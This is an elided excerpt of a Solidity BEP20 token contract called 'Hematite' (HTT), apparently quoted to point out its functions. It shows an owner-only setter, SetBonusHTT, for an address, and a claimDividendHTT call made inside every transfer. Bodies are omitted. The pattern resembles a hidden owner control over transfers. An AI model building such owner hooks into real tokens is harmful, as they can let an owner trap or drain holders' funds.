...
contract Hematite is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'Hematite';
  string private constant _symbol = 'HTT';
  ...
  */
  ...
  function claimDividendHTT(address sender, address recipient, uint256 amount) private returns (uint256) {      
  ...
  function SetBonusHTT(address c) public onlyOwner {
    C = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendHTT(sender, recipient, amount);   
